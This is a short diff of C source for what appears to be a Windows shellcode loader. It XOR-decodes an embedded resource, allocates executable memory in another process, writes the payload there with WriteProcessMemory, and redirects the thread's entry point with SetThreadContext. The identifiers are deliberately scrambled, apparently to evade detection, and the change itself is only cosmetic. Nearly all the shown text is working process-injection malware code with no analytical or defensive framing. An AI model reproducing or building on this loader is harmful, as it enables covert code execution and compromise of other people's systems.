@@ -15,8 +15,8 @@ void thisistheloadresou(const char* resName, char** data, DWORD* size) {
 }
 
 void youareawsomeenc(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
-    for (DWORD aa = 0; aa < dancodeLen; aa++) {
-        dancode[aa] ^= dkdan1e2y6[aa % dank1e2y6Len];
+    for (DWORD i = 0; i < dancodeLen; i++) {
+        dancode[i] ^= dkdan1e2y6[i % dank1e2y6Len];
     }
 }
 
@@ -48,9 +48,7 @@ int main() {
 
     LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-
     WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
-    // Update entry point
     ctx.Rcx = (DWORD64)dankummm; 
     SetThreadContext(pi.hThread, &ctx);
 
